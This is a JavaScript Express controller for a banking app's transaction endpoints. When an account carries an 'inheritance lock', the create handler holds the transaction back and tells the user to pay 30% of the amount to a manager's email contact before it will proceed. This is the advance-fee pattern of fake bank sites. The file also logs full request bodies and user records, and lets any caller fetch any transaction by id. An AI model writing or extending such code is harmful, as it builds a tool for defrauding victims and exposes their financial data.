const Transaction = require("../models/Transaction");
const Account = require("../models/Account");
const User = require("../models/User");
const { notifyFinancialEvent } = require("../services/notificationService");
const { validateWithdrawal } = require("../services/withdrawalService");

// Generate a unique reference for transactions
function generateUniqueReference() {
  return `TXN-${Date.now()}-${Math.random().toString(36).substr(2, 9).toUpperCase()}`;
}

exports.create = async (req, res) => {
  try {
    console.log("Transaction create req.body:", req.body);
    console.log("req.user:", req.user);
    const { accountId, amount, type, transactionType, currency, description, category } =
      req.body;
    const account = await Account.findById(accountId);
    if (!account) return res.status(404).json({ message: "Account not found" });
    if (!account.hasAccess(req.user._id))
      return res.status(403).json({ message: "Forbidden" });

    const user = await User.findById(req.user._id);
    if (!user) return res.status(404).json({ message: "User not found" });
    let alertMessage = null;

    if (user.inheritanceLocked) {
      alertMessage = `Your account has an inheritance lock. To proceed with this transaction, you must pay 30% of the transaction amount (${(Math.abs(amount) * 0.3).toFixed(2)} ${currency}) to unlock inheritance rights. Please contact your account manager at ${user.bankManagerEmail} to clarify your inheritance issue. This message will persist until resolved.`;
    }

    const tx = await Transaction.create({
      user: req.user._id,
      type,
      transactionType,
      amount,
      currency,
      description,
      category,
      reference: generateUniqueReference(),
      metadata: { account: accountId },
    });

    // Check if this is a withdrawal (explicit type or negative amount)
    const isWithdrawal =
      (type && type.toLowerCase().includes("withdraw")) ||
      (typeof amount === "number" && amount < 0);
    
    if (isWithdrawal) {
      // Use service to validate withdrawal with tailored error message
      const withdrawalError = await validateWithdrawal(user, account, Math.abs(amount), currency);
      
      if (withdrawalError) {
        return res.status(withdrawalError.status || 403).json({
          message: withdrawalError.message,
          code: withdrawalError.code,
          details: withdrawalError.details,
          action: withdrawalError.action,
          ...(withdrawalError.limit && { limit: withdrawalError.limit }),
          ...(withdrawalError.requestedAmount && { requestedAmount: withdrawalError.requestedAmount }),
          ...(withdrawalError.currentBalance !== undefined && { currentBalance: withdrawalError.currentBalance }),
          ...(withdrawalError.shortfall && { shortfall: withdrawalError.shortfall }),
          ...(withdrawalError.maxAllowedAmount && { maxAllowedAmount: withdrawalError.maxAllowedAmount }),
        });
      }
    }

    if (user.inheritanceLocked) {
      const response = { tx };
      if (alertMessage) {
        response.alert = alertMessage;
      }
      return res.status(200).json(response);
    }

    account.balance += amount;
    await account.save();

    // Update transaction status to completed
    tx.status = "completed";
    await tx.save();

    // Create notification for the user
    await notifyFinancialEvent(req.user._id, "transaction", "outgoing", {
      id: tx._id,
      amount: Math.abs(amount),
      currency,
      description,
    });

    res.status(201).json(tx);
  } catch (err) {
    console.error("Transaction creation error:", err);
    res.status(400).json({ message: err.message });
  }
};

exports.getForAccount = async (req, res) => {
  try {
    const account = await Account.findById(req.params.accountId);
    if (!account) return res.status(404).json({ message: "Account not found" });
    if (!account.hasAccess(req.user._id))
      return res.status(403).json({ message: "Forbidden" });
    const txs = await Transaction.find({
      "metadata.account": req.params.accountId,
    }).sort({ createdAt: -1 });
    res.json(txs);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
};

exports.getById = async (req, res) => {
  try {
    const tx = await Transaction.findById(req.params.id);
    if (!tx) return res.status(404).json({ message: "Transaction not found" });
    res.json(tx);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
};

exports.listForUser = async (req, res) => {
  try {
    const txs = await Transaction.find({ user: req.user._id }).sort({
      createdAt: -1,
    });
    res.json(txs);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
};
